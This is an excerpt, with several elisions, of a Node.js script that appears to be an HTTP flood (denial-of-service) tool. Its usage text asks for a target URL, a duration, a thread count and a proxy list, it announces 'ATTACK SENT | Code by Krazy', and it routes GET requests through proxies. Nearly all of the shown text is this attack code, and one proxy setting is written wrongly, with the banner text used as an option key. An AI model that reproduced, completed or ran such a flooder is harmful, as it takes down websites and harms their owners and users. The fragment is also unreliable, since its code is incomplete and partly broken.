...
async function poptto() {
    if (process.argv.length !== 6) {
        console.log(`node https.js url times threads proxy or proxies.txt`);
        console.log(`vi du : node https.js https://website.com 120 1000 proxies.txt`);
        process.exit(0);
    }else{
        ...
        if (process.argv[5] == 'off') {
            console.log("ATTACK SENT | Code by Krazy")
        ...
        function run() {
            if (process.argv[5] !== 'off') {
                ...
                var proxiedRequest = request.defaults({'ATTACK SENT | Code by Krazy': 'http://'+proxy});
                var config = {
                    method: 'get',
                    url: target,
                    headers: {
